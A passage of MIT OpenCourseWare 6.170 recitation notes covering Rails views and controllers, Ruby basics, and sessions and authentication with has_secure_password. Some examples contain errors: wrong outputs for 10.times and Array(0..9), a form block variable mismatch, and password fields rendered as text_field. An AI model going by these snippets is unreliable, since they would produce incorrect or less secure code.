book.price%></td>\n</tr>\n<% end %>\n</table>\nNote: @books must be previously initialized - preferably in the controller. Otherwise it will be nil\nand you will get an error\nOutput a HTML form for entering book information:\n<%= form_for @book do |b| %>\n<p>\n<%= b.label :title%>\n<%= b.text_field :title%>\n</p>\n<p>\n<%= b.label :price%>\n<%= b.text_field :price%>\n</p>\n<p>\n<%= b.label :author%>\n<%= b.text_field :author%>\n\n</p>\n<% end %>\nNote:\n1.\nForm automatically generated with the correct post URL for resource \"book\"\n2.\nHTML Labels and Text Fields generated via corresponding tags. You can also use pure\nHTML\n3.\nTags available for other common HTML elements; provide convenient features like\nvalidation etc.\nLayout Templates\nExample Layout:\n<!DOCTYPE html>\n<html>\n<head>\n<!-- include scripts and stylesheets here -->\n</head>\n<body>\n<div id=\"header\">\n<!-- header goes here -- >\n</div>\n<div id=\"main-body\">\n<%= yield %>\n</div>\n<div id=\"footer\">\n<!-- header goes here -- >\n</div>\n</body>\n</html>\n1.\nEach view can have a layout template, including no layout.\n2.\nTypically used to create a template for header and footer of pages - then each view\nfocuses on only its part\n3.\nLayouts are in app/views/layouts; Default layout is \"application.html.erb\"\n4.\nInclude your views using <%= yield %> directive in layout\n5.\nController wide layouts possible.\n6.\nrender directive also can take a layout parameter\na.\nrender \"new\", :layout => :home_page\nb.\nrender \"new\", :layout => false\nView Partials\n\nIncluding repeated HTML code\nClient Side Assets\nDetails of CSS, Javascript, and other client side assets will be covered in a later recitation.\nTopic #3: Controllers\nControllers help isolate presentation layer from the data layer - separation of concerns\nUsing this - you can use the same code to develop a web based app, a mobile based app, or a\nsome other view technology without changing much of the underlying code. Similarly you can\nuse any data store - relational databases, flat files, etc. and switch between them without\nchanging any of the view code.\nDefault/Base Controller: ApplicationController (application_controller.rb)\nNew controllers are created using:\n$ rails generate controller <name> <action1> <action2> etc.\nLets look at books_controller.rb\nclass BooksController < ApplicationController\n## This will use \"app/views/layouts/book_layouts.html.erb\" as the\n## layout for all views in this controller, unless overriden in a\n## method.\nlayout :book_layout\ndef index\nrender \"index\", :layout => false\nend\ndef new\n@time_now = Time.now\n## render \"new\", :layout => false\nend\nend\nYou can start adding new methods which will perform actions. For example:\ndef checkout\n## This is pseudo code\n@book = Book.find(params[:book_id])\nif (@book.available?)\n@book.checkout(params[:user_id])\n\nmsg = \"Book checked out\"\nelse\nmsg = \"Book not available for checkout\"\nend\nrender \"checkout\", :layout => false\nend\nSome useful objects available to you in the controllers are:\nparams: A hash of HTTP params which came with the request.\nrequest: The HTTP request object as a hash\nsession: The session object as a hash\nSome useful directives in controllers:\nrender \"view\", :layout => [layout_name | false]\nrender :nothing => true ## Useful for async actions for which you do\nnot need ack\nrender :inline => \"<%= Time.now %>\" ## I've never used this form\nrender :text => \"OK\" ## Useful for AJAX calls\nrender :json => @books\nrender :xml => @books\nrender :js => \"<js_code_here>\" ## Not a good practice\nredirect_to \"/relative/path/to/view\"\nNote: Any instance variables that you require in the view must be set up in the current action\nbefore calling render.\nTopic #4: Data Access in Rails (\"Model\" part of MVC)\nhttp://guides.rubyonrails.org/active_record_querying.html\nhttp://guides.rubyonrails.org/migrations.html\nActiveRecord is a data interface/access layer: allows you to store/retrieve/query a database\nwithout having to learn and worry about SQL. All you need to know is the corresponding model\nclass in ruby and rails takes care of the SQL level details of interaction with the database!\nGenerating a Model\n$ rails generate model library name:string address:string\n$ invoke active_record\n$ create db/migrate/20130211132022_create_libraries.rb\n$ create app/models/library.rb\n$ invoke test_unit\n\n$ create test/unit/library_test.rb\n$ create test/fixtures/libraries.yml\nThis command generate the model class (app/models/library.rb), a migration script to create the\ncorresponding table in the database (db/migrate/xxx_create_libraries.rb), and some files to run\ntests.\napp/models/library.rb:\nclass Library < ActiveRecord::Base\nattr_accessible :address, :name\nend\nNote:\n1.\nLibrary class extends from ActiveRecord::Base which provides many utility methods\nfor interacting with Model objects. (as you will see)\n2.\nattr_accessible directive specifies the accessible attributes of the model via getters\nand setters, i.e. \"library.name\", \"library.address\" can be used on the LHS or RHS of an\nassignment expression.\n3.\nMany more useful directives available.\ndb/migrate/20130211132022_create_libraries.rb:\nclass CreateLibraries < ActiveRecord::Migration\ndef change\ncreate_table :libraries do |t|\nt.string :name\nt.string :address\nt.timestamps\nend\nend\nend\nNote:\n1.\nThis migration script creates the database table.\n2.\nAutomatically adds an \"id\" field to the model (not shown) and a timestamps field to hold\nthe last updated timestamp for each record.\nCreating the Database Table\n$ rake db:migrate\n\nSimple operations on the Library model\nYou can now start using this model in your code. Examples are shown below:\n## Return a library object with id 10\n@library = Library.find(10)\n## Create a new library object and save it to the database\nlib = Library.new({:name => \"Hayden\", :address => \"100 Memorial\nDrive\"})\nlib.save()\n## Retrieve a library object with name = \"Hayden\"\nlibrary = Library.find_by_name(\"Hayden\")\nMore Fun Details of the Model\nEnforcing Referential Constraints:\nIn Book class: belongs_to :library\nIn Library class: has_many :books\nRetrieving multiple objects:\nUse Model.xxx where xxx = where, select, group, having, order, limit,\njoin, order\nTopic #5: Some Useful Rails Configuration Files\n1.\nboot.rb, application.rb, environment.rb\n2.\ndatabase.yml\nTopic #6: Debugging Rails Apps\nWhich IDE should use for development?\nYour TAs are familiar with the following:\n●\nSublime + Vi editor with command line\n●\nEmacs Editor with command line\n●\nRubyMine (30 day trial)\nOthers have used\n●\nAptana RadRails\nFor more of debugging, see: http://guides.rubyonrails.org/debugging_rails_applications.html\n\nTopic #7: Some useful heroku commands\nYou'll only need to specify --app <app_name> if you're not in your app directory:\n$ heroku logs [--app <app_name>]\nFor viewing application logs on heroku (use $ heroku logs --tail to stream the logs live)\n$ heroku logs [--app <app_name>]\nFor viewing application logs on heroku\n$ heroku config [--app <app_name>]\nTo configure your environment variables. Access to heroku services (mail server, data stores,\nsocial plugins etc) is usually via environment variables\n$ heroku sql [--app <app_name>]\nProvides a sql console to your database\n$ heroku run rake db:create [--app <app_name>]\n$ heroku run rake db:migrate [--app <app_name>]\n$ heroku run ls -las [--app <app_name>]\n$ heroku run ssh [--app <app_name>]\nRuns the specified command. Warning: Use cautiously!\nNext Tutorialp\nDetails of the Ruby programming language\n\nMIT OpenCourseWare\nhttp://ocw.mit.edu\n6.170 Software Studio\nSpring 2013\nFor information about citing these materials or our Terms of Use, visit: http://ocw.mit.edu/terms."
    },
    {
      "category": "Resource",
      "title": "Recitation 3: Ruby Basics",
      "type": "PDF",
      "source_url": "https://ocw.mit.edu/courses/6-170-software-studio-spring-2013/2e69ee44f007cdd7bdc84e476cda97f9_MIT6_170S13_rec3-Ruby.pdf",
      "content": "6.170 Tutorial 3 - Ruby Basics\nPrerequisites\n1. Have Ruby installed on your computer\na. If you use Mac/Linux, Ruby should already be preinstalled on your machine.\nb. If you have a Windows Machine, you can install Ruby using the Ruby Installer\nhere http://rubyinstaller.org\nNote: Having completed Tutorial 0, Ruby should already be installed on your\ncomputer.\nGoals of this Tutorial\nBecome familiar with the Ruby programming language.\nUseful Resources for Ruby\n1. Chapter 4 of Ruby on Rails Tutorial http://ruby.railstutorial.org/ruby-on-rails-tutorial-book\n2. Interactive Code School Tutorial http://www.codeschool.com/paths/ruby\n3. Learning Ruby\nhttp://proquest.safaribooksonline.com/book/web-development/ruby/9780596529864\n[Note: Need MIT Certificate for this]\n4. Programming Ruby http://www.ruby-doc.org/docs/ProgrammingRuby/\nTopic 1: Basic Information about Ruby\n1. What is it?\na. It is a programming language invented in the mid1990s by Yukihiro Matsumoto\nb. It is a general purpose objectoriented programming language that has a syntax\ninfluenced by Perl/Python/Lisp\nc. Similar to Python, it is an interpreted language, meaning that its code is executed\nline by line during runtime (Rather than being compiled)\n2. Pros of using Ruby\na. Allows for simple and fast creation of web applications\nb. Access to a library of over 50,000 RubyGems\nc. \"Concise, Elegant, and Powerful\"\n3. Cons of using Ruby\na. Ruby runs quite slow compared to other languages. In fact, it can be up to 20\ntimes slower than Java when processing\nb. Poor Standard library documentation\n\nTopic 2: Ruby vs Python\n1. Philosophy\na. Python was designed to emphasize programming productivity and code\nreadability\nb. Ruby was designed to \"make programming fun for its creator\"\n2. Object Oriented Programming\na. Both programming languages support object oriented programming\nb. In Ruby, an instance of literally any type is an object. For instance, in Ruby, C\nClass and Module instances are objects, with Classes and Modules themselves\nbeing objects.\nc. However, where in Ruby all functions and most operators are in fact methods of\nan object, in python functions are first-class object themselves. A function in\nPython is typically declared as a member of another object (typically a Class,\nInstance, or Module), but can be freely passed around and attached to other\nobjects at will.\n3. Syntax\na. Python has nice functional features such as list comprehension and generators.\nRuby doesn't have these.\nb. However, Ruby gives you more freedom in how you write your code:\nparenthesis are optional and blocks aren't whitespace delimited like they are in\nPython\n4. Speed\na. Python generally executes code faster than Ruby\n5. Applications\na. Python sees use in automating system administration and software\ndevelopment, web application development, analyzing scientific data (with help of\nnumpy, scipy, and matplotlib modules), biostatisics, and teaching introductory\ncomputer science and programming.\nb. Ruby sees use in web application development, and general programming.\nTopic 3: Lexical Conventions of Ruby\n1. White Space\na. Whitespace characters such as spaces and tabs are generally ignored\nin Ruby code, except when they appear in strings.\n2. Line Endings\na. Ruby interprets semicolons and newline characters as the ending of a\nstatement.\nHowever, if Ruby encounters operators, such as +, - , or backslash at the\n\nend of a line, they indicate the continuation of a statement.\nb. Be careful when dealing with expressions spanning multiple lines. Remember to\nalways append a '+' at the end of a line if the expression is continued on the line\nbelow it.\nc. Ex: a = ( 4 + 5 ) //prints out 9\nd. Ex: a = ( 4\n+ 5 ) //prints out 5 [NOTE THE DIFFERENCE]\nThe reason this happens is because the expression is treated as a = (4; +5).\nThat is, it evaluates a \"4\" and then evaluates a \"+5\" (which then is the resultant\nvalue, as it was the last evaluated).\ne. Ex: a = ( 4 +\n5 ) //prints out 9\n3. Comments\na. Comments are lines of annotation within Ruby code that are ignored at runtime.\nComments extend from # to the end of the line.\nb. Ex: # This is a comment\nc. Ruby code can also contain embedded documents too. Embedded documents\nextend from a line beginning with =begin to the next line beginning with -end.\n=begin and =end must come at the beginning of a line.\nd. Ex: =begin\nThis is an embedded document.\n=end\n4. Identifiers\na. Identifiers are names of variables, constants, and methods\nb. Ruby distinguishes between identifiers consisting of uppercase characters\nand those of lowercase characters.\nc. Identifier names may consist of alphanumeric characters and the underscore\ncharacter ( _ ).\nd. You can distinguish a variable's type by the initial character of its identifier\n5. Reserved words\na. Ruby has a set of reserved words that may not be used as constant or\nlocal variable names.\nb. List of reserved words http://www.tutorialspoint.com/ruby/ruby_quick_guide.htm\nTopic 4: Ruby is ObjectOriented\nRuby has classes. Classes hold data--in the form of variables and constants--and methods,\nwhich are compact collections of code that help you perform operations on data. Classes can\ninherit information from each other, but only one at a time. This allows you to reuse code--which\nmeans you'll spend less time fixing or debugging code--and intermix the code through\ninheritance.\n\nIn Ruby, almost everything is an object. In fact, everything that Ruby can bind to a variable name\nis an object.\nLet's do an example.\nclass Hello\ndef howdy\ngreeting= \"Hello, Matz!\"\nputs greeting\nend\nend\nclass Goodbye < Hello\ndef solong\ngreeting = \"Goodbye, Matz!\"\nputs greeting\nend\nend\nfriendly = Goodbye.new\nfriendly.howdy\nfriendly.solong\nIf we run the code above, we will get back:\nHello, Matz!\nGoodbye, Matz.\nThe reason is:\nThe Hello class defines the howdy method. The Goodbye class likewise contains the definition of\na method, solong. The Goodbye class also inherits what's in the Hello class (that's what the <\nsymbol is for). This means that the Goodbye class didn't have to redefine the howdy method. It\njust inherited it.\nfriendly is an object (an instance of the Goodbye class). You can use the friendly object to call\nboth the howdy and solong methods, because it inherently knows about them. It knows about the\nsolong method because it is defined inside the Goodbye class, and it knows about the howdy\nmethod because Goodbye inherited it from Hello.\n\nTopic 5: Declaring Variables\n1. Ruby doesn't have type declarations. It just assigns values to variables\na. Example: months = 12\n2. Local Variables:\na. Must start with a lowercase letter or with an underscore character\nb. Example 1: alpha\nc. Example 2: _beta\nd. When a local variable is defined inside a method or a loop, its scope is within the\nmethod or loop where it was defined.\n3. Instance Variables\na. An instance variable is a variable that is referenced via an instance of a class and\ntherefore belongs to a given object.\nb. It is always prefixed by a single at (@) sign\nc. Example: @hello = 6170\nd. You can access instance variables from outside of their class only by accessor\nmethods\n4. Class Variables\na. A\ninstances of a class. Only one copy of a\nclass variable exists for a given class.\nb. It is always prefixed by two at signs (@@)\nc. You have to initialize a class variable before you use it\nd. Example: @@times = 0\n5. Global Variables\na. Global variables are available globally to a program, inside any structure. Their\nscope is the whole program.\nb. It is always prefixed by a dollar sign ($)\nc. Example: $amount = \"0.00\"\nTopic 6: Math\n1. Converting Numbers\na. Integer(1.4) => 1\n// converts a floating-point number\nb. Integer(\"256\") => 256\n// converts a string\nc. Integer(\"0b100\") => 8\n// converts a binary number from string\nd. Integer(?z) => 122\n// converts a character to ASCII\n2. Basic Math Operators:\na. Use + , - , * , / for addition, subtraction, multiplication, and division\n\nb. Use ** for exponent\nc. Use % for modulo\n3. Division and Truncation\na. 25 / 2 => 12\n// Integer division always rounded down\nb. 25.0 / 2 => 12.5\n// Use a float as at least one operand to stop truncation\n4. Ranges\na. The range operator . . means an inclusive range of numbers.\nExample: 1 . . 10 = (1, 2, 3, 4, 5, 6, 7, 8, 9, 10)\nb. The range operator . . . means a range of numbers excluding the last one\nExample: 1 . . . 10 = (1, 2, 3, 4, 5, 6, 7, 8, 9)\nc. Creating an array of a range of numbers:\n(1 . . 9).to_a => [1, 2, 3, 4, 5, 6, 7, 8, 9]\n//.to_a means \"to array\"\n5. Useful Math methods\na. Absolute value: -40.abs => 40\nb. Ceiling: 4.65.ceil => 5\nc. Floor: 4.65.floor => 4\nd. Rounding: 100.45.round => 100\nTopic 7: String\n1. Basic string functions:\na. title = String.new\n// sets title = \"\"\nb. title.empty?\n// returns boolean showing whether title is empty (\"\")\nc. title.length\n// returns length of title\n2. Concatenating Strings\na. \"Hello,\" \" \" \"Matz\" \"!\"\n// Creates \"Hello, Matz!\"\nb. \"Hello,\" + \" \" + \"Matz\" + \"!\"\n// Similarly, creates \"Hello, Matz!\"\nc. \"Hello, \" << \"Matz!\"\n// Again, creates \"Hello, Matz!\"\nd. \"Hello, \".concat \"Matz!\"\n// Also creates \"Hello, Matz!\"\n3. Accessing Strings\na. line = \"A horse! a horse! my kingdom for a horse!\"\nb. line[18, 23] => \"my kingdom for a horse!\" // 18 = starting index location,\n// 23 = number of letters to retrieve\nc. line.index(\"k\") => 21\n// returns 1st index location where \"k\" appears\n4. Comparisons\na. hay == nicolay\n// Compares hay with nicolay. Returns false.\nb. hay.eql? nicolay\n// Compares hay with nicolay. Returns false.\nc. \"a\" <=> \"v\"\n// <=> is spaceship operator. Returns 0 if equal,\n-1 if less than, and 1 if greater than\n\n5. Inserting a String in a String\na. \"Be carful .\" .insert 6, \"e\" => \"Be careful.\"\n//Insert \"e\" at index 6\n6. Substitute a Substring\na. \"That's alll fokes\".gsub \"alll\", \"all\" => \"That's all folks\"\n7. Reversing a String:\na. \"abcdefghijkl\".reverse => \"lkjihgfedcba\"\nTopic 8: Arrays\n1. The Array class is one of Ruby's built-in classes. Ruby arrays can hold objects such\nas String, Integer, Fixnum, Hash, Symbol, even other Array objects. Any object that\nRuby can create, it can hold in an array.\n2. Adding elements to a Ruby array will cause it to automatically increase in size\n3. A Ruby array can hold objects of all different types, not just one type\n4. Basic Array Functions\na. months = Array.new\n// Creates a new array [ ]\nb. months.empty?\n// Returns boolean of whether months is empty\nc. months.size\n// Returns size of array\nd. months.length\n// Also returns size of array\ne. months.clear\n// Clears the array to [ ]\nf. months = Array.[ ] (\"jan\", \"feb\", \"mar\", \"dec\") //Creates array months\ng. months = [ nil, \"Jan\", \"Feb\", \"Mar\", \"Dec\" ] //Another way to create array\nh. digits = Array(0 . . 9)\n//Creates array [1, 2, 3, 4, 5, 6, 7, 8, 9]\n5. Iterating over Array\na. sample = [\"a\", \"b\", \"c\", \"d\", \"z\", 1, 5]\nsample.each { |e| print e } //prints out each element of sample\n6. Accessing elements of array\na. months = [\"Jan\", \"Feb\", \"Mar\", \"Apr\", \"May\", \"Jun\", \"Jul\", \"Aug\", \"Dec\" ]\nb. months[0] // returns Jan\nc. months[-1] // returns Dec\nd. months[0, 2] // start index = 0, number of elements to extract = 2\n// Returns [\"Jan\", \"Feb\"]\ne. months.include? \"Nov\" //Returns whether \"Nov\" is present in months\n7. Concatenation\na. Let q1, q2 be two arrays. You can concatenate both arrays into one array called\nq3 using: q3 = q1 + q2\nb. yrs = [2010, 2011, 2012]\n\nyrs << 2013\n// yrs is now [2010, 2011, 2012, 2013]\n8. Set Operations\na. Intersection (&) creates a new array, merging the common elements of two\narrays\nbut removing uncommon elements and duplicates\nExample: year = semester1 & semester2\nb. Difference (-) creates a new array, removing elements that appear in both arrays\nExample: year = semester1 - semester2\nc. Union (|) joins two arrays together, removing duplicates\nExample: year = semester1 | semester2\n9. Extracting Unique Elements\na. shopping_list = [\"apples\", \"oranges\", \"apples\", \"bananas\", \"oranges\"]\nshopping_list.uniq!\n//Returns [\"apples\", \"oranges\", \"bananas\"]\n10. Deletions\na. months = [\"Jan\", \"Feb\", \"Mar\", \"Apr\", \"May\", \"Jun\", \"Jul\", \"Aug\", \"Dec\" ]\nb. months.delete(\"Jan\") //Deletes element \"Jan\" from array\nc. months.delete_at(2) //Deletes element at index 2 from array\n11. Iterations\na. Array has an each method that allows you to iterate over every element in the\narray\nb. Ex: months.each { |e| print e }//prints out every element inside months\n12. Sorting an array of numbers\na. num_list = [2, 5, 1, 7, 23, 99, 14, 27]\nb. num_list.sort! //sorts num_list to [1, 2, 5, 7, 14, 23, 27, 99]\nTopic 9: Conditionals\n1. If Statements\na. Example: if x == 256\nputs \"x equals 256\"\nend\nb. The operator && means \"and\"\nExample: if a == 10 && b == 27...\nAlternatively, you can do: if a == 10 and b == 27...\nc. The operator || is used to represent \"or\"\nExample: if a == 10 || b ==27\nAlternatively: if a == 10 or b == 27...\n2. The Ternary Operator:\n\na. Example: label = length == 1? \"argument\" : \"arguments\"\nb. This expression assigns a string value to label based on the value of length. If the\nvalue of length is 1, then the string value \"argument\" will be assigned to label; but if\nit is not true--that is, if length has a value other than 1--then the value of label will\nbe the string \"arguments\".\n3. While Loops\na. A while loop executes the code it contains as long as its conditional statement\nremains true.\nb. Ex: while i < breeds.size do\ntemp << breeds[i].capitalize\ni += 1\nend\nc. You can break out of a while loop using the keyword break.\nEx: while i < breeds.size\ntemp << breeds[i].capitalize\nbreak if temp[i] == \"Arabian\"\ni += 1\nend\n4. For Loops\na. A for loop executes the body of the code a certain number of times\nb. Ex: for i in 1. . 5 do\nprint i, \" \"\nend\n//Prints 1 2 3 4 5\nc. Note: You need to keep the \"end\" at the end of the loop. However, the \"do\" is\noptional\nd. Alternatively, you can use the times method:\n10.times { | i | print i, \" \" }\n//Prints 1 2 3 4 5 6 7 8 9 10\ne. Use the upto method to count up to a certain number from a starting num:\n1.upto(10) { |i| print i, \" \" }\n//Prints 1 2 3 4 5 6 7 8 9 10\nf. Use the downto method to count down to a certain num from a start num:\n5.downto(1) { |i| print i, \" \" } //Prints 5 4 3 2 1\nTopic 10: Using Blocks\n1. What are blocks?\na. A block consists of chunks of code\nb. You assign a name to a block\nc. The code in the block is always enclosed within braces { }\nd. A block is always invoked from a function with the same name as that of the block.\nThis means that if you have a block with the name test, then you can use the\nfunction test to invoke this block.\n\ne. If you are familiar with python, a block in Ruby is similar to a lambda function\nin python.\nf. You invoke a block by using the yield statement\n2. Syntax\na. Ex: block_name {\nstatement1\nstatement2\n.....\n}\n3. Executing a block\na. Again, you invoke a block by using a simple yield statement.\nb. Example:\nclass Hello\ndef test\nputs \"you are in the method\"\nyield\nputs \"you are again back inside the method\"\nyield\nend\ntest { puts \"You are in the block\" }\nend\nExecuting the method test above will produce the following results:\nYou are in the method\nYou are in the block\nYou are again back inside the method\nYou are in the block\n4. Passing parameters to the block\na. You can also pass parameters to the block with the yield statement.\nb. Ex: class Hello\ndef test\nyield 5\nputs \"You are in the method test\"\nyield 100\nend\ntest { | i | puts \"You are in block #{ i }\" }\nend\nExecuting the method test above will generate the following output:\nYou are in block 5\nYou are in the method test\nYou are in the block 100\nc. If you want to pass more than one parameters, simply append the extra\n\nparameters to the end of yield (i.e. yield param1, param2, ... param100}\nTopic 11: Embedding Ruby in HTML\n1. <% Ruby Code %> The Ruby code between the delimiters is replaced with its\noutput.\nEx: <HTML>\n....\n<Body>\n<% if item_quantity - item_count > 0 %>\n<b> This item is in stock </b>\n<% end %>\n</Body>\n</HTML>\n2. <%= Ruby Expression %> The Ruby expression between the delimiters is replaced\nwith its value.\nEx: <HTML>\n...\n<Body>\nThe value of x is : <%= x %>\n</Body>\n<HTML>\n3. <%# Ruby Code %> The Ruby code between the delimiters is commented out and\nignored.\nNext Tutorial: Sessions and Authentication\n\nMIT OpenCourseWare\nhttp://ocw.mit.edu\n6.170 Software Studio\nSpring 2013\nFor information about citing these materials or our Terms of Use, visit: http://ocw.mit.edu/terms."
    },
    {
      "category": "Resource",
      "title": "Recitation 4: Sessions and Authentication",
      "type": "PDF",
      "source_url": "https://ocw.mit.edu/courses/6-170-software-studio-spring-2013/7e69522ad48df4bbbd8e019add74c8de_MIT6_170S13_rec4-SessAuth.pdf",
      "content": "6.170 Tutorial 4 - Sessions and Authentication\nPrerequisites\n1. Having rails installed is recommended.\nGoals of this Tutorial\n1. Understand the basics of cookies and sessions and how to use them in rails.\n2. Basic Authentication mechanisms in rails.\nResources\nhttp://railscasts.com/episodes/250-authentication-from-scratch\nhttp://railscasts.com/episodes/270-authentication-in-rails-3-1\nhttp://railscasts.com/episodes/274-remember-me-reset-password\nTopic 1: Cookies\nA cookie is a piece of text that a website (web server) can store on a user's hard disk. Cookies\nallow a website to store information on a user's machine and later retrieve it. When the user\nbrowses the same website in the future, the data stored in the cookie can be retrieved by the\nwebsite to notify the website of the user's previous activity. The data is stored as keyvalue pairs.\nFor example, a website might generate a unique ID number for each visitor and store the ID\nnumber on each user's machine using a cookie file.\nWhen your browser sends a request to a webserver it will look on your machine for a cookie file\nthat the same web server has set. If it finds a cookie file, your browser will send all the keyvalue\npairs along with the request.\nThe web server will receive the request and be able to access the cookie data. It will be able to\nuse these cookies to gather information about the user.\nAdditionally, the web server can send extra information with the cookie such as expiration date or\npath (so the site can have different cookie values with different parts of the site).\nIn the broadest sense, a cookie allows a site to store state information on your machine. This\ninformation lets a web server remember what state your browser is in. An ID is one simple piece\nof state information if an ID exists on your machine, the site knows that you have visited\nbefore. The state is, \"Your browser has visited the site at least one time,\" and the site knows\nyour ID from that visit.\nThings to keep in mind: People often share machines, cookies are easily (and often) erased,\npeople have multiple machines.\n\nWarning: Cookies are sent with every request to the server! As a web developer, you should\navoid storing large amounts of data inside cookies. Cookies are limited to 4kb in size.\nSetting Cookies\nTypically, cookies are set in an HTTP response to the browser -- the server can specify in the\nheader that a certain cookie should be set. (Note, cookies may also be set by Javascript:\ndocument.cookie = \"key = value\")\nAn HTTP response header may look like this:\nHTTP/1.1 200 OK\nContent-type: text/html\nSet-Cookie: name=value\nSet-Cookie: name2=value2; Expires=Wed, 09-Jun-2021 10:18:14 GMT\nThe \"Set-Cookie\" directive tells the browser to create a cookie with that key and value, and to\nsend that cookie back on future requests.\nE.g. a future request from the site to the server might be:\nGET /spec.html HTTP/1.1\nHost: www.example.org\nCookie: name=value; name2=value2\nAccept: */*\nAlong with key-value pairs, the server can also set cookie attributes. These attributes tell the\nbrowser when to send the key-value pairs back. (Cookie attributes themselves are not sent back\nto the server.)\nCookie attributes\n●\nDomain and Path\n○\nTells the browser that the cookie should only be sent back for the given domain\nand path\n●\nExpires and Max-Age\n○\nTells the browser when to delete the cookie\n■\nExpires: provide a date\n■\nMax-Age: provide a number of seconds to persist\n○\nIf neither are specified, the default is that it will be deleted by the browser after the\nuser closes the browser.\n●\nSecure and HttpOnly\n○\nThese are binary attributes -- either present or not. They don't have an associated\nvalue.\n○\nSecure: tells browsers only to use the cookie under secure/encrypted\nconnections\n\n○\nHttpOnly: tells browsers to only use cookies via the HTTP protocol -- e.g. don't\nallow Javascript to modify cookies. (This attribute is used extensively by\nFacebook and Google to prevent some security vulnerabilities which we won't get\ninto yet.)\nFor example:\nSet-Cookie: HSID=AYQEVn....DKrdst; Domain=.foo.com; Path=/; Expires=Wed,\n13-Jan-2021 22:23:01 GMT; HttpOnly\nTopic 2: Sessions\nHTTP is a stateless protocol -- it doesn't require the server to remember anything about a single\nuser across multiple requests.\nThis works fine for serving static content, but what about dynamic/customized content? For\nexample, a user on Amazon would want to see the same items in his \"shopping cart\" as he\nbrowses from page to page. We need some way to keep track of data from such a user\nsession.\nA common solution to this problem is using browser cookies. (Other solutions: server side\nsessions, hidden form variables, adding parameters to the URL.)\nTopic 3: Sessions in Rails\nRails has built-in support for keeping track of user sessions.\nThere are a few storage mechanisms. All of these storage mechanisms use a cookie to store a\nunique ID for each session. They differ in where the rest of the data is kept.\n●\nActionDispatch::Session::CookieStore - Stores everything on the client.\n●\nActiveRecord::SessionStore - Stores the data in a database using Active Record.\n●\nActionDispatch::Session::CacheStore - Stores the data in the Rails cache.\nIf you'd like to change how you're storing sessions you can take a look and change it in the\nconfig/initializers/session_store.rb.\nThe default store is CookieStore, which stores all data in the browser cookie. Note that the data\nstored in the cookie isn't encrypted, so users can read it if they wanted. However, the cookie is\nsigned so that users can't modify their cookie -- if they do, Rails will not accept it.\nNo matter which mechanism you choose, the session will be accessible via the sessions hash.\nYou might set a user_id in the session hash.\nuser = User.find_by_email(params[:email])\nsession[:user_id] = user.id\n\nThe user can then be retrieved on a subsequent call like so:\nUser.find(session[:user_id]) if session[:user_id]\nTopic 4: Authentication (vs Authorization)\nAuthentication involves verifying that \"this person is who they say they are.\" For example, you\nmay show a photo ID to prove that you are this person with that name. On a website, you may\nenter in a username and password.\nDon't confuse this with authorization! Authorization refers to answering the question of \"what is\nthis user allowed to access\" - authentication asks \"who is this user?\"\nTopic 5: HTTP Basic Auth\nIf you want something cheap and don't need much security, you can use http basic\nauthentication. The following line at the top of a controller will create a popup that asks for the\nusername and password before allowing the user to proceed to each page that the controller\nopens.\nhttp_basic_authenticate_with :name => \"dnj\", :password => \"password\"\nIf you don't want this to apply to all methods within a controller, you can restrict it with extra\nparameters:\nhttp_basic_authenticate_with :name => \"username\", :password =>\n\"password\" :except => [:index, :show]\nhttp_basic_authenticate_with :name => \"username\" :password =>\n\"password\" :only => :destroy\nNote that this option is insecure because your password is always sent in plaintext, and the\npassword is stored in the code in plaintext. We might instead choose to use https as store a\npassword hash instead of the password itself.\nTopic 6: Secure Authentication\nRails has a built-in helper method for authentication, called has_secure_password. It\nencrypts user passwords for you before storing them. For the API docs on\nhas_secure_password, you can refer to\nhttp://api.rubyonrails.org/classes/ActiveModel/SecurePassword/ClassMethods.html.\nWe'll do an example to see how to use it:\nrails generate model user email:string password_digest:string\nNote that we need a \"password_digest\" column. This field stores the encrypted passwords.\nhas_secure_password assumes this field will exist.\n\nhas_secure_password\n●\nmust put \"bcrypt-ruby\" in Gemfile\n●\nadds methods to set and authenticate the entered password\n●\nadds validators to the password and password confirmation\n●\nadds authentication functionality\nRun the migration\nrake db:migrate\napp/models/user.rb\nclass User < ActiveRecord::Base\nattr_accessible :email, :password, :password_confirmation\nhas_secure_password\nvalidates_presence_of :password, :on => :create\nend\nThe attr_accessible statement prevents the password_digest from being set from the user\nregistration form.\nCreate a users controller\nrails generate controller users\napp/controllers/users_controller.rb\nclass UsersController < ApplicationController\ndef new\n@user = User.new\nend\ndef create\n@user = User.new(params[:user])\nif @user.save\nredirect_to root_url, :notice => \"You are signed up.\"\nelse\nrender \"new\"\nend\nend\nend\nInside app/views/users/new.html.erb\n<h1>Sign Up</h1>\n<%= form_for @user do |form| %>\n<div class=\"field\">\n\n<%= f.label :email %>\n<%= f.text_field :email %>\n</div>\n<div class= \"field\">\n<%= f.label :password %>\n<%= f.text_field :password %>\n</div>\n<div class = \"field\">\n<%= f.label :password_confirmation %>\n<%= f.text_field :password_confirmation %>\n</div>\n<div class= \"actions\">\n<%= f.submit %>\n</div>\n<% end %>\nWe also need to let users log in, not just sign up. When we log a user in, though, we're not\ncreating a new user -- we're creating a new session. We'll create a controller to handle\nsessions.\nrails generate controller sessions\napp/controllers/sessions_controller.rb\nclass SessionsController < ApplicationController\ndef new\nend\ndef create\nuser = User.find_by_email(params[:email])\nif user && user.authenticate(params[:password])\nsession[:user_id] = user.id\nredirect_to root_url, :notice => \"Logged in\"\nelse\nflash.now.alert = \"Invalid email or password\"\nrender \"new\"\nend\nend\ndef destroy\nsession[:user_id] = nil\nredirect_to root_url :notice=> \"Logged out\"\nend\nend\nThe authenticate method is given to us by has_secure_password, and checks the given\n\npassword against the password in the database\napp/views/sessions/new.html.erb\n<h1>Log in</h1>\n<%= form_tag sessions_path do %>\n<div class= \"field\">\n<%= label_tag :email %>\n<%= text_field_tag :email, params[:email] %>\n</div>\n<div class= \"field\">\n<%= label_tag :password %>\n<%= password_field_tag :password %>\n</div>\n<div class = \"actions\">\n<%= submit_tag \"Log in\" %>\n</div>\n<% end %>\nNote: we use form_tag rather than form_for because we're not editing a resource.\nNow, we're going to want to access the logged-in user from other parts of the site, after the user\nis logged in. We can make a helper method accessible to all views, that does this.\nIn app/controllers/application_controller.rb\nclass ApplicationController < ActionController::Base\nprotect_from_forgery\nprivate\ndef current_user\n@current_user ||= User.find(session[:user_id]) if\nsession[:user_id]\nend\nhelper_method :current_user\nend\nYou can find a skeleton web app with basic user log in abilities at\nhttps://github.com/jtwarren/session_demo.\ngit clone https://github.com/jtwarren/session_demo.git\nNext Tutorial: HTML & CSS\n\nMIT OpenCourseWare\nhttp://ocw.mit.edu\n6.170 Software Studio\nSpring 2013\nFor information about citing these materials or our Terms of Use, visit: 